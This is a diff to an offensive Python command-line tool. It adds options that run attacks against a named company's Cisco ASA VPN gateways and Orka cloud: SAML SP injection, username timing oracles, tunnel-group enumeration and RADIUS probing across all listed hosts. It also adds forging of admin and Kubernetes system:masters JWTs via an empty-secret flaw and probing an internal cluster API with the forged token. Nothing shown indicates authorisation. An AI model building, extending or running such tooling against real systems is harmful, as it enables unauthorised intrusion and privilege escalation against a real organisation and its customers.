@@ -147,7 +147,9 @@ except ImportError:
 try:
     from cisco_cstp_attack import (
         HostScanGateRE, CSTPTunnelRE, ASDMJarClassRE, GoBinaryRE,
+        SAMLSpInjectionRE, UsernameTimingOracleRE, TunnelGroupEnumRE, RADIUSClassAttrRE,
         analyze_asa_attack_surface, analyze_go_binary, analyze_java_class,
+        analyze_saml_sp, analyze_username_oracle, analyze_tunnel_groups, analyze_radius_class_attr,
     )
     HAS_CSTP = True
 except ImportError:
@@ -155,6 +157,26 @@ except ImportError:
     HostScanGateRE = None
     CSTPTunnelRE = None
     GoBinaryRE = None
+    SAMLSpInjectionRE = None
+    UsernameTimingOracleRE = None
+    TunnelGroupEnumRE = None
+    RADIUSClassAttrRE = None
+
+try:
+    from orka_oidc_re import (
+        run_full_re as orka_oidc_run,
+        run_jwt_analysis as orka_jwt_analysis,
+        forge_admin_token, forge_system_masters_token,
+        get_binary_re_findings,
+        probe_cluster_info, probe_k8s_api, probe_harbor_creds,
+        probe_oidc_discovery,
+        generate_pkce, generate_oidc_login_url,
+        KNOWN_TOKEN,
+    )
+    HAS_ORKA_OIDC = True
+except ImportError:
+    HAS_ORKA_OIDC = False
+    orka_oidc_run = None
 
 
 MACSTADIUM_ASAS = [
@@ -842,6 +864,21 @@ def main():
     parser.add_argument('--cstp', metavar='HOST', help='CSTP/HostScan/DAP attack surface RE')
     parser.add_argument('--cstp-all', action='store_true', help='CSTP RE against all MacStadium ASAs')
     parser.add_argument('--go-re', metavar='BINARY', help='Go binary static RE (module graph, endpoints, creds)')
+    parser.add_argument('--saml-sp', metavar='HOST', help='SAML SP injection RE against ASA WebVPN')
+    parser.add_argument('--saml-sp-all', action='store_true', help='SAML SP injection against all MacStadium ASAs')
+    parser.add_argument('--username-oracle', metavar='HOST', help='Username timing oracle via POST /+webvpn+/index.html')
+    parser.add_argument('--username-oracle-all', action='store_true', help='Username oracle against all MacStadium ASAs')
+    parser.add_argument('--tunnel-groups', metavar='HOST', help='Enumerate tunnel groups / connection profiles')
+    parser.add_argument('--tunnel-groups-all', action='store_true', help='Tunnel group enum against all MacStadium ASAs')
+    parser.add_argument('--radius-re', metavar='HOST', help='RADIUS class attr 25 attack surface RE')
+    parser.add_argument('--radius-re-all', action='store_true', help='RADIUS class attr RE against all MacStadium ASAs')
+    parser.add_argument('--orka-oidc', action='store_true', help='Orka3 OIDC flow RE + JWT forge (CVE-2020-26160, empty secret)')
+    parser.add_argument('--orka-jwt', action='store_true', help='Analyze + forge MacStadium JWT (HS256 empty-secret)')
+    parser.add_argument('--orka-binary-re', action='store_true', help='Print orka3 binary RE findings summary')
+    parser.add_argument('--forge-admin', action='store_true', help='Forge admin@macstadium.com JWT token')
+    parser.add_argument('--forge-masters', action='store_true', help='Forge system:masters JWT for K8s cluster-admin')
+    parser.add_argument('--orka-k8s', metavar='PATH', default='/api/v1/namespaces', help='Probe K8s API at 10.221.188.19:6443 with forged token')
+    parser.add_argument('--oidc-discovery', action='store_true', help='Probe idp.macstadium.com OIDC discovery paths')
 
     args = parser.parse_args()
     
@@ -1112,6 +1149,104 @@ def main():
         else:
             print(f"[*] Go binary RE: {args.go_re}")
             result = analyze_go_binary(args.go_re)
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'saml_sp', None) or getattr(args, 'saml_sp_all', False):
+        ablation.banner()
+        if not HAS_CSTP:
+            print("[-] cisco_cstp_attack module not available")
+        else:
+            targets = MACSTADIUM_ASAS if getattr(args, 'saml_sp_all', False) else [
+                {'host': args.saml_sp, 'port': 443, 'label': args.saml_sp}
+            ]
+            for t in targets:
+                print(f"\n[*] SAML SP injection RE: {t['label']} ({t['host']})")
+                result = analyze_saml_sp(t['host'], t['port'])
+                print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'username_oracle', None) or getattr(args, 'username_oracle_all', False):
+        ablation.banner()
+        if not HAS_CSTP:
+            print("[-] cisco_cstp_attack module not available")
+        else:
+            targets = MACSTADIUM_ASAS if getattr(args, 'username_oracle_all', False) else [
+                {'host': args.username_oracle, 'port': 443, 'label': args.username_oracle}
+            ]
+            for t in targets:
+                print(f"\n[*] Username timing oracle: {t['label']} ({t['host']})")
+                result = analyze_username_oracle(t['host'], t['port'])
+                print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'tunnel_groups', None) or getattr(args, 'tunnel_groups_all', False):
+        ablation.banner()
+        if not HAS_CSTP:
+            print("[-] cisco_cstp_attack module not available")
+        else:
+            targets = MACSTADIUM_ASAS if getattr(args, 'tunnel_groups_all', False) else [
+                {'host': args.tunnel_groups, 'port': 443, 'label': args.tunnel_groups}
+            ]
+            for t in targets:
+                print(f"\n[*] Tunnel group enum: {t['label']} ({t['host']})")
+                result = analyze_tunnel_groups(t['host'], t['port'])
+                print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'radius_re', None) or getattr(args, 'radius_re_all', False):
+        ablation.banner()
+        if not HAS_CSTP:
+            print("[-] cisco_cstp_attack module not available")
+        else:
+            targets = MACSTADIUM_ASAS if getattr(args, 'radius_re_all', False) else [
+                {'host': args.radius_re, 'port': 443, 'label': args.radius_re}
+            ]
+            for t in targets:
+                print(f"\n[*] RADIUS class attr RE: {t['label']} ({t['host']})")
+                result = analyze_radius_class_attr(t['host'], t['port'])
+                print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'orka_oidc', False):
+        ablation.banner()
+        if not HAS_ORKA_OIDC:
+            print("[-] orka_oidc_re module not available")
+        else:
+            print("[*] Orka3 OIDC RE + JWT attack suite...")
+            result = orka_oidc_run()
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'orka_jwt', False):
+        ablation.banner()
+        if not HAS_ORKA_OIDC:
+            print("[-] orka_oidc_re module not available")
+        else:
+            result = orka_jwt_analysis()
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'orka_binary_re', False):
+        ablation.banner()
+        if not HAS_ORKA_OIDC:
+            print("[-] orka_oidc_re module not available")
+        else:
+            result = get_binary_re_findings()
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'forge_admin', False):
+        if not HAS_ORKA_OIDC:
+            print("[-] orka_oidc_re module not available")
+        else:
+            print(forge_admin_token())
+
+    elif getattr(args, 'forge_masters', False):
+        if not HAS_ORKA_OIDC:
+            print("[-] orka_oidc_re module not available")
+        else:
+            print(forge_system_masters_token())
+
+    elif getattr(args, 'oidc_discovery', False):
+        ablation.banner()
+        if not HAS_ORKA_OIDC:
+            print("[-] orka_oidc_re module not available")
+        else:
+            print("[*] Probing idp.macstadium.com OIDC discovery...")
+            result = probe_oidc_discovery()
             print(json.dumps(result, indent=2, default=str))
 
     elif args.containers:
